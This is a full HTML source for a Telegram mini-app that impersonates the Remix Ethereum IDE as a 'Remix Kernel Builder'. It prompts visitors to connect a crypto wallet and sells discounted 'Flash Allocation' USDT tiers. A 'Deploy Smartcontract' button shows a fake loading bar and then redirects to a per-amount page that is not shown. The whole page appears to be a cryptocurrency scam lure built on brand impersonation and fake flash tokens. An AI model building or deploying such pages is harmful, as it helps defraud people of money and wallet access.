<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Grok Enterprise Node - Remix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <!-- AppKit & Ethers Connectivity -->
    <script type="module">
        import { createAppKit } from 'https://esm.sh/@reown/appkit'
        import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
        import { mainnet, bsc, arbitrum } from 'https://esm.sh/@reown/appkit/networks'

        const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 

        const metadata = {
            name: 'Remix Kernel Builder',
            description: 'IDE Cloud Development',
            url: window.location.origin,
            icons: ['https://remix.ethereum.org/favicon.ico']
        }

        const modal = createAppKit({
            adapters: [new EthersAdapter()],
            networks: [bsc, mainnet, arbitrum],
            metadata,
            projectId,
            features: { analytics: true, email: false, socials: false },
            themeMode: 'dark',
            themeVariables: { '--w3m-accent': '#6EEB36', '--w3m-z-index': 10000 }
        })

        window.appKitModal = modal;

        // وظيفة موحدة لتحديث واجهة المستخدم عند الاتصال
        function updateUIOnConnect(address) {
            if (window.isWalletConnected) return; // منع التكرار

            const btn = document.getElementById('walletBtn');
            const shortAddr = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
            
            btn.innerHTML = `
                <div class="flex items-center gap-3">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6EEB36" stroke-width="2.5">
                        <path d="M20 6L9 17L4 12"></path>
                    </svg>
                    <span class="text-[#6EEB36] font-mono">BSC: ${shortAddr}</span>
                </div>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6EEB36" stroke-width="2.5">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>`;
            
            btn.classList.add('border-[#6EEB36]');
            window.isWalletConnected = true;
            
            // إغلاق أي نافذة عالقة برمجياً
            if (modal.isOpen) modal.close();
            
            if (typeof validateAction === 'function') validateAction();
        }

        // الاستماع لتغييرات الحساب
        modal.subscribeAccount(state => {
            if (state.isConnected && state.address) {
                updateUIOnConnect(state.address);
            }
        });

        // آلية فحص قوية (Polling) لحل مشكلة التعليق في تليجرام
        setInterval(() => {
            const account = modal.getAccount();
            if (account && account.isConnected && account.address && !window.isWalletConnected) {
                updateUIOnConnect(account.address);
            }
        }, 800);
    </script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            user-select: none;
            color: #f0f0f0;
            display: flex;
            flex-direction: column;
        }
        
        .app-overlay { position: fixed; inset: 0; background: radial-gradient(circle at center, #0a1a05 0%, #000 100%); z-index: 1; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 1000;
            background: #000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .content-container {
            position: relative;
            background-image: url('background.png');
            background-size: cover;
            background-position: center;
            border-radius: 40px 40px 0 0;
            border-top: 2px solid rgba(110, 235, 54, 0.5);
            box-shadow: 0 -20px 60px rgba(0,0,0,1);
            flex: 1;
            display: flex;
            flex-direction: column;
            padding-bottom: env(safe-area-inset-bottom);
            overflow: visible;
            margin-top: 60px;
        }

        .content-inner {
            position: relative;
            z-index: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            padding: 24px;
            padding-top: 70px;
        }

        .profile-wrapper {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }

        .remix-input {
            background: rgba(18, 18, 18, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.05);
            color: #fff;
            transition: all 0.3s ease;
            backdrop-filter: blur(12px);
        }

        .ui-btn {
            box-sizing: border-box;
            padding: 20px 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #6EEB36;
            font-weight: 800;
            font-size: 14px;
            background: rgba(110, 235, 54, 0.05);
            border: 1px solid rgba(110, 235, 54, 0.2);
            cursor: not-allowed;
            transition: 0.4s;
            overflow: hidden;
            border-radius: 20px;
            width: 100%;
            text-transform: uppercase;
        }

        .ui-btn.ready {
            cursor: pointer;
            background: #6EEB36;
            color: #000;
            border-color: #6EEB36;
            box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3);
        }

        #bottomSheetOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            z-index: 500;
        }

        #bottomSheet {
            position: fixed;
            bottom: -100%;
            left: 0;
            right: 0;
            background: #1c1c1e;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px 24px 0 0;
            z-index: 501;
            transition: bottom 0.4s cubic-bezier(0.32, 0.72, 0, 1);
            max-height: 85vh;
            overflow-y: auto;
            padding-bottom: env(safe-area-inset-bottom);
        }

        #bottomSheet.active { bottom: 0; }

        .sheet-header {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .close-btn {
            position: absolute;
            right: 20px;
            color: #8e8e93;
            font-size: 20px;
        }

        .sheet-title {
            font-weight: 600;
            font-size: 16px;
            color: #fff;
        }

        .amount-option {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: background 0.2s;
            cursor: pointer;
        }

        .amount-option:active { background: rgba(255, 255, 255, 0.05); }

        .usdt-icon-wrapper {
            width: 44px;
            height: 44px;
            border-radius: 12px;
            background: #2c2c2e;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 14px;
        }

        .usdt-img {
            width: 28px;
            height: 28px;
            object-fit: contain;
        }

        .chevron-right {
            color: #48484a;
            font-size: 18px;
        }
    </style>
</head>
<body class="fixed inset-0">

    <div class="app-overlay"></div>

    <!-- Loading Screen -->
    <div id="loadingOverlay" class="loading-overlay">
        <img src="erc.gif" class="w-16 h-16 mb-6" alt="Kernel">
        <div class="text-[#6EEB36] text-[11px] font-black tracking-[0.5em] uppercase mb-8 text-center">Synchronizing Remix Kernel...</div>
        <div class="w-56 h-[2px] bg-white/5 rounded-full overflow-hidden">
            <div id="progressBar" class="h-full bg-[#6EEB36] shadow-[0_0_15px_#6EEB36] transition-all duration-300 w-0"></div>
        </div>
    </div>

    <!-- Bottom Sheet for Amount Selection -->
    <div id="bottomSheetOverlay"></div>
    <div id="bottomSheet" class="no-scrollbar">
        <div class="sheet-header">
            <span class="sheet-title">Select Volume</span>
            <button onclick="closeSheet()" class="close-btn">✕</button>
        </div>
        
        <div id="amountOptionsContainer" class="py-2">
            <!-- Options generated by JS -->
        </div>

        <div class="h-10"></div>
    </div>

    <div class="flex-1 flex flex-col relative z-10 w-full h-full">
        
        <div class="h-[120px] flex items-center justify-center pt-8">
             <div class="text-center">
                <h2 id="userName" class="text-white text-[16px] font-bold tracking-tight mb-0.5 uppercase">REMIX NODE</h2>
                <span id="userId" class="text-[#6EEB36] font-mono text-[10px] opacity-60">KRNL-0.54.0</span>
            </div>
        </div>

        <div class="content-container">
            <div class="profile-wrapper">
                <div class="relative">
                    <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] border border-black/50 shadow-[0_10px_40px_rgba(0,0,0,0.8)] overflow-hidden">
                        <img id="userPhoto" src="https://ui-avatars.com/api/?name=Remix&background=000&color=6EEB36" class="w-full h-full rounded-[30px] object-cover" alt="Profile">
                    </div>
                    <div class="absolute bottom-1 -right-1 w-7 h-7 bg-[#6EEB36] rounded-full border-4 border-black flex items-center justify-center z-10">
                        <div class="w-2 h-2 bg-black rounded-full"></div>
                    </div>
                </div>
            </div>

            <div class="content-inner">
                <div class="flex-1 space-y-5 overflow-y-auto no-scrollbar">
                    
                    <div class="flex items-center gap-4 bg-white/5 p-4 rounded-2xl border border-white/5">
                        <img src="remix.png" class="w-10 h-10" alt="Remix" onerror="this.src='https://remix.ethereum.org/favicon.ico'">
                        <div>
                            <h3 class="text-white text-[14px] font-bold">REMIX IDE BUILDER</h3>
                            <p class="text-white/40 text-[10px] font-medium uppercase tracking-wider">Cloud Kernel Environment</p>
                        </div>
                    </div>

                    <div class="bg-orange-500/10 border border-orange-500/20 p-4 rounded-2xl">
                        <p class="text-[11px] text-orange-400 font-medium text-center leading-relaxed">
                            NOTICE: Please use a completely empty wallet to ensure the safety of your main assets during testing.
                        </p>
                    </div>

                    <button id="walletBtn" onclick="window.appKitModal.open()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[14px] font-bold active:scale-[0.98] transition-all">
                        <div class="flex items-center gap-3">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="text-[#6EEB36]"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                            <span>Connect Wallet</span>
                        </div>
                        <span class="text-white/20">›</span>
                    </button>

                    <div class="space-y-2">
                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Allocation Volume</label>
                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
                            <span id="selectedAmountText">Select volume & price</span>
                            <span class="text-[#6EEB36] text-xl">›</span>
                        </button>
                    </div>

                </div>

                <div class="pt-6 mt-auto">
                    <button id="authorizeBtn" disabled class="ui-btn">
                        <span>Deploy Smartcontract</span>
                    </button>
                    <div class="text-center mt-4">
                        <span class="text-white/10 font-bold text-[10px] uppercase tracking-[0.4em]">Remix Terminal v0.54</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        window.isWalletConnected = false;
        let selectedAmount = null;

        const basePrice = 14.99;
        const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];

        const user = tg.initDataUnsafe?.user;
        if (user) {
            document.getElementById('userName').textContent = (user.first_name + ' ' + (user.last_name || '')).toUpperCase();
            if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
        }

        const sheet = document.getElementById('bottomSheet');
        const overlay = document.getElementById('bottomSheetOverlay');
        const trigger = document.getElementById('amountSheetTrigger');
        const optionsContainer = document.getElementById('amountOptionsContainer');

        function openSheet() {
            overlay.style.display = 'block';
            setTimeout(() => sheet.classList.add('active'), 10);
        }

        function closeSheet() {
            sheet.classList.remove('active');
            setTimeout(() => overlay.style.display = 'none', 400);
        }

        trigger.onclick = openSheet;
        overlay.onclick = closeSheet;

        amounts.forEach(amt => {
            const currentPrice = ((amt / 100) * basePrice).toFixed(2);
            const div = document.createElement('div');
            div.className = 'amount-option';
            div.innerHTML = `
                <div class="flex items-center">
                    <div class="usdt-icon-wrapper">
                        <img src="usdt.png" alt="USDT" class="usdt-img" onerror="this.src='https://cryptologos.cc/logos/tether-usdt-logo.png'">
                    </div>
                    <div class="flex flex-col">
                        <span class="text-white text-[15px] font-bold">${amt} USDT</span>
                        <span class="text-[#8e8e93] text-[11px] font-medium">Flash Allocation</span>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <div class="text-right">
                        <span class="text-white text-[15px] font-bold">$${currentPrice}</span>
                    </div>
                    <span class="chevron-right">›</span>
                </div>
            `;
            div.onclick = () => {
                selectedAmount = amt;
                document.getElementById('selectedAmountText').innerHTML = `
                    <div class="flex items-center gap-3">
                        <img src="usdt.png" alt="USDT" class="w-5 h-5" onerror="this.src='https://cryptologos.cc/logos/tether-usdt-logo.png'">
                        <span class="text-white font-bold">${amt} USDT</span>
                        <span class="text-[#6EEB36] font-bold">— $${currentPrice}</span>
                    </div>
                `;
                closeSheet();
                validateAction();
            };
            optionsContainer.appendChild(div);
        });

        function validateAction() {
            const btn = document.getElementById('authorizeBtn');
            if (window.isWalletConnected && selectedAmount) {
                btn.disabled = false;
                btn.classList.add('ready');
            }
        }

        document.getElementById('authorizeBtn').onclick = function() {
            if (this.disabled) return;
            const loading = document.getElementById('loadingOverlay');
            const bar = document.getElementById('progressBar');
            loading.style.display = 'flex';
            let p = 0;
            const interval = setInterval(() => {
                p += 3; bar.style.width = p + '%';
                if (p >= 100) {
                    clearInterval(interval);
                    window.location.href = `${selectedAmount}.html`;
                }
            }, 30);
        };
    </script>
</body>
</html>
